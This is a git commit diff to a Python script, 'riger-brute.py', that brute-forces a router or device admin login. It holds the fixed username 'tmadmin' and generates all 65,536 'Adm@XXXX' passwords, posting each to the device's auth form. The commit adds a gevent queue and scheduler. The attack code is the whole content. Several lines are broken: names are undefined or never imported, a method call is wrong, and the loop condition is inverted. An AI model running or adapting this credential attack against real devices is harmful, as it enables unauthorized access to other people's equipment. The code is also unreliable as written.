1790b34bc02aa3597cf7dd381996e7100315a45d
Zypeh <Zypeh.geek@gmail.com>
2015-12-30 17:51:11 +0800

    Added scheduler, and signal handling, minor correction

--- riger-brute.py
+++ riger-brute.py
@@ -3,36 +3,12 @@
 
 import requests
 from requests.exceptions import ConnectionError
-import gevent as g
+import gevent as Greenlet
+from  gevent.queue import Queue
 
-# dapw = {}
-# for x in xrange(65536):
-#     backnum = len(hex(x).split('0x')[1])
-#     if backnum < 4:
-#         num = '0' * (4 - backnum) + hex(x).split('0x')[1]
-#         dapw[x] = 'Adm@' + num.upper()
-#     else:
-#         num = hex(x).split('0x')[1]
-#         dapw[x] = 'Adm@' + num.upper()
+req = Queue(maxsize = 45)
+success = False
 
-# target = str(raw_input('Target IP: '))
-# print 'Running...'
-# location = ''
-# for x in xrange(65536):
-#     print '\r-------> ' + str(x)
-#     payload = {'LoginNameValue': 'tmadmin',
-#                'LoginPasswordValue': dapw[x]}
-#     try:
-#         r = requests.post('http://' + target + '/Forms/TM2Auth_1',
-#                           data=payload, allow_redirects=False,
-#                           timeout=60)
-#         location = r.headers['Location']
-#     except ConnectionError, e:
-#         print str(x) + ' Error!!'
-#     if 'rpSys.html' in location:
-#         print 'Success!! The PW is ' + dapw[x]
-#         break
-    
 def gene(x):
     num = len(hex(x).split('0x')[1])
     if num < 4:
@@ -41,24 +17,34 @@ def gene(x):
         res = hex(x).split('0x')[1]
     return 'Adm@' + res.upper()
 
-def send(x, target):
-    content = gene(req)
-    payload = {
-        'LoginNameValue' : 'tmadmin',
-        'LoginPasswordValue' : content, }
-    
-    try:
-        r = reqest.post('http://' + target + '/Forms/TM2Auth_1',
-                        data=payload, allow_redirects=False,
-                        timeout=60)
-        location = r.headers['Location']
-    except ConnectionError as e:
-        print '{} is error'.format(str(content))
+def task(target):
+    while not req.Empty() or success:
+        content = gene(req.get())
+        payload = {
+            'LoginNameValue' : 'tmadmin',
+            'LoginPasswordValue' : content, }
+        
+        try:
+            r = request.post('http://' + target + '/Forms/TM2Auth_1',
+                             data=payload, allow_redirects=False,
+                             timeout=60)
+            location = r.headers['Location']
+        except ConnectionError as e:
+            print '{} is error'.format(str(content))
+        
+        if 'rpSys.html' in location:
+            print 'Success!! Password is {}'.format(content)
+            success = True
+            
+    Greenlet.sleep(0)
 
-    if 'rpSys.html' in location:
-        print 'Success!! Password is {}'.format(content)
+def scheduler():
+    for i in xrange(65536):
+        task.put_nowait(i)
         
 if __name__ == '__main__' :
     target = str(raw_input('Target IP: '))
-    g.joinall([g.spawn(send, x, target) for x in xrange(65536)])
+    gevent.signal(signal.SIGQUIT, gevent.shutdown)
+    Greenlet.spawn(scheduler).join()
+    Greenlet.joinall([Greenlet.spawn(task, target)])
     
